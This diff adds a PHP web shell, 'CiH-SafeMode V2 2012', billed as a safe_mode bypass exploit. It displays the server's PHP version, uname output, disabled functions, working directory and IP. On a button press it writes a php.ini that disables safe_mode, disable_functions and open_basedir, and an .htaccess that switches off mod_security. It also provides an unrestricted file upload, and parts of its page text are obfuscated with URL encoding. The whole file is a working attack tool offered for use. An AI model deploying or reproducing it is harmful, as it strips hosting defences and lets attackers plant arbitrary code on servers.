@@ -1,0 +1,189 @@
+<?php
+##########################################################
+###----------------------------------------------------###
+###-----PHP FFI Extension Safe_mode Bypass Exploit-----###
+###----------------------------------------------------###
+###-Tested on 5.2.16 & Tested on 5.2.17----------------###
+###----------------------------------------------------###
+###-Author:--CiH_H@CkErZ-------------------------------###
+###-Email:---cih_hacker[at]yahoo[dot]com---------------###
+###-Website:-http://cihiq.com -------------------------###
+###----------------------------------------------------###
+##########################################################
+?>
+<html>
+<head>
+    <title>CiH-SafeMode</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <style>
+        body {
+            color:#fff;
+            background-color:#585858;
+            font-size:11px;
+        }
+        table {
+            font-family: Verdana, Tahoma;
+            font-size:11px;
+        }
+        tr {
+            border: #D9D9D9 1px solid;
+        }
+        td {
+            border: #D9D9D9 1px solid;
+        }
+        a {
+            color: #fff;
+        }
+        input {
+            background-color:#800000;
+            color:#FFFFFF;
+            font-family:Tahoma;
+            font-size:8pt;
+        }
+        select {
+            background-color:#800000;
+            color:#FFFFFF;
+            font-family:Tahoma;
+            font-size:8pt;
+        }
+        textarea {
+            background-color:#800000;
+            color:#FFFFFF;
+            font-family:Tahoma;
+            font-size:8pt;
+        }
+    </style>
+	<meta name="description" content="CiH-SafeMode V2 2012">
+	<meta name="keywords" content="cih, CiH, safe, mode, cih99">
+</head>
+<body style="background-color: #4A4A4A">
+    <script type="text/javascript">
+        function toggleEnviron()
+        {
+            if (document.getElementById('environ_table').style.display=="none")
+                document.getElementById('environ_table').style.display="";
+            else
+                document.getElementById('environ_table').style.display="none";
+        }
+    </script>
+    <center>
+    <Script Language='Javascript'>
+<!--  -->
+<!--
+document.write(unescape('%3C%63%65%6E%74%65%72%3E%3C%68%32%3E%43%69%48%2D%53%61%66%65%4D%6F%64%65%20%56%32%20%32%30%31%32%3C%62%72%3E%0A%09%3C%66%6F%6E%74%20%73%69%7A%65%3D%22%33%22%3E%2E%3A%20%46%75%63%6B%20%41%6C%6C%20%53%79%73%74%65%6D%20%3A%2E%3C%2F%66%6F%6E%74%3E%3C%2F%68%32%3E%3C%2F%63%65%6E%74%65%72%3E'));
+//-->
+</Script>
+    </center>
+    <table width="100%">
+        <tr><td bgcolor="#333333" style="border-color: #000000">
+            <font color="#FFFF00">php is : <?php echo phpversion(); ?> <br />
+            uname -a: <?php echo (php_uname()); ?> <br />
+            <?php echo (php_uname());
+echo "<br>";
+$mod = (ini_get ("safe_mode"));
+if ($mod == 1)   {
+echo "safe mode is : <font color='#FF0000'>ON</font> (secure)</font>
+ ";
+} else {
+echo "safe mode is: <font color='#008000'>OFF</font>
+<font color='#008000'>(not secure)</font>";
+}
+?> <br />
+			disable functions : <?php if(''==($badfunctions=@ini_get('disable_functions')))
+{echo "<font color='008000'>no functions</font></b>";}
+else
+{echo "<font color=FF0000>$badfunctions</font></b>";}
+?> <br />
+			Directory : <?php $dir = getcwd(); echo $dir; ?> <br />
+			Server IP : <?php $server = gethostbyname($_SERVER["HTTP_HOST"]); echo $server; ?>
+        </font>
+        </td></tr>
+    </table>
+    <p />
+    <div style="display:$edit_file_box_visibility">
+        <p />
+    </div>
+    <p />
+    <p align="center" />
+    <b><font face="Verdana" style="font-size: 9pt">.: Fuck Safe Mode :.</font></b><br />
+    <table width="100%">
+        <tr>
+            <td style="border-color:#000000; text-align:center" width="50%" bgcolor="#333333">
+                &nbsp;                	<?php
+                	echo "<right>";
+echo"<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
+	<p align='center'>
+	<INPUT type='submit' name='FucK' value='Click on this message to Fucked Safe mode' id=input style='font-size: 12pt; font-weight: bold; border-style: inset; background-color: #444444; border-width: 1px'></p>
+</form>
+";
+echo "<right/>";
+if  (empty($_POST['FucK'] ) ) {
+	}ELSE{
+	$action = '?action=FucK';
+
+                	echo "<html>
+<br>
+<head>
+<meta http-equiv='pragma' content='no-cache'>
+</head><body>";
+
+$fp = fopen("php.ini","w+");
+fwrite($fp,"safe_mode = Off
+disable_functions = NONE
+safe_mode_gid = OFF
+
+open_basedir = OFF ");
+echo "<b>php.ini Created successfully</b>";
+echo ("<br>")
+?>
+
+<?
+$pwd = getcwd();
+$fp2 = fopen(".htaccess","w+");
+fwrite($fp2,"<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>");
+echo "<b>.htaccess Created successfully</b><br>";
+
+    echo "</font></center></td></tr></table> ";
+
+	exit;
+	}
+?>
+
+</td>
+        </tr>
+    </table>
+    <table width="100%">
+        <tr>
+            <td style="border-color:#000000; text-align:center" bgcolor="#333333">
+                <form method="POST" enctype="multipart/form-data">
+                    <p style="text-align: left">&nbsp;&nbsp;&nbsp;&nbsp; Upload: <?php $cwd = getcwd(); ?>
+                    <input type="file" name="uploads" style="border: 1px solid #808080; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px; background-color: #000000" size="33">&nbsp;
+                    <input type="submit" value="Upload" style="border: 1px outset #000000; background-color: #444444">
+
+                &nbsp;<font color="#00FF00">[OK]</font> Max size: 40MB</p>
+                </form>
+<?php if (!empty ($_FILES['uploads']))
+{
+    move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);
+    echo "<script>alert('successfully'); </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type'];
+}
+
+?>
+
+            </td>
+        </tr>
+    </table>
+    <p />
+    <p />
+    <p />
+<Script Language='Javascript'>
+<!--  -->
+<!--
+document.write(unescape('%20%20%20%20%3C%74%61%62%6C%65%20%77%69%64%74%68%3D%22%31%30%30%25%22%3E%0A%20%20%20%20%20%20%20%20%3C%74%72%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%64%20%73%74%79%6C%65%3D%22%62%6F%72%64%65%72%2D%63%6F%6C%6F%72%3A%23%30%30%30%30%30%30%3B%20%74%65%78%74%2D%61%6C%69%67%6E%3A%63%65%6E%74%65%72%22%20%62%67%63%6F%6C%6F%72%3D%22%23%33%33%33%33%33%33%22%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%22%23%30%30%46%46%30%30%22%20%73%69%7A%65%3D%22%31%22%3E%20%2E%3A%5B%20%52%65%2D%43%6F%64%69%6E%67%20%42%79%20%43%69%48%5F%48%40%43%6B%45%72%5A%20%7C%20%63%69%68%5F%68%61%63%6B%65%72%40%79%61%68%6F%6F%2E%63%6F%6D%20%7C%20%47%65%6E%65%72%61%74%65%64%3A%20%30%2E%37%37%37%38%20%73%65%63%6F%6E%64%73%20%5D%3A%2E%20%3C%2F%66%6F%6E%74%3E%3C%2F%74%64%3E%0A%20%20%20%20%20%20%20%20%3C%2F%74%72%3E%0A%20%20%20%20%3C%2F%74%61%62%6C%65%3E%0A'));
+//-->
+</Script>
+</body>
+</html>
